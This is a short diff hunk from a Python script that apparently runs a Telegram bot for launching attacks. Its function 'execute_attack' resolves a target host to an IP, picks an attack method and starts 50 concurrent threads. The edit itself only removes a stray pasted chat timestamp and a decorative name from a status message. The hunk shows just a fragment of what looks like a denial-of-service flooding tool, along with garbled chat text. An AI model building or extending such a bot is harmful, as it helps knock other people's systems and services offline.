@@ -102,7 +102,7 @@ def execute_attack(message):
     try:
         ip = socket.gethostbyname(target) if not is_valid_ip(target) else target
         method_id = user_attacks[chat_id]['method']
-[27/09/47 12:52 ص] ⁨اىـٰٰٰٖٖٓٓـཻ͢ـ✧َُِــٗ‍ؒؒـٰٰٰٰٖٜٖٖٖٜ۬ـعدآ͢م: bot.send_message(chat_id, f"🚀 LAUNCHING {ATTACK_METHODS[method_id]} AT {ip}")
+⁨bot.send_message(chat_id, f"🚀 LAUNCHING {ATTACK_METHODS[method_id]} AT {ip}")
         
         # Multi-threaded attack launch
         for _ in range(50):  # 50 concurrent threads
